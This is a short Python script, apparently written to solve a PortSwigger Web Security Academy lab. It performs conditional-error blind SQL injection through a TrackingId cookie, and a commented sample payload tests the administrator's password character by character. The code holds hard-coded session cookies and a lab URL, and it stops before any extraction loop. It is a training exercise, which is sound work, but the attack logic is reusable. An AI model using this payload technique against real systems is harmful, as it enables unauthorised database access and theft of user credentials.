import requests
import string

charset = string.ascii_lowercase + string.digits

burp0_url = "https://0a33001b04f7a1a080c7088400d400c3.web-security-academy.net/filter?category=Pets"
burp0_cookies = {
    "TrackingId": "Ms58hEvnEIFr8BFU",
    "session": "PMbkBEcoEZTDBal6TbCJPq8dM9BEUW6M",
}

res = requests.get(burp0_url, cookies=burp0_cookies)


# Sample payload: ' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
def blind_sql(payload):
    global burp0_url
    global burp0_cookies
    modified_cookies = burp0_cookies.copy()
    modified_cookies["TrackingId"] += payload
    res = requests.get(burp0_url, cookies=modified_cookies)
    return "Internal Server Error" in res.text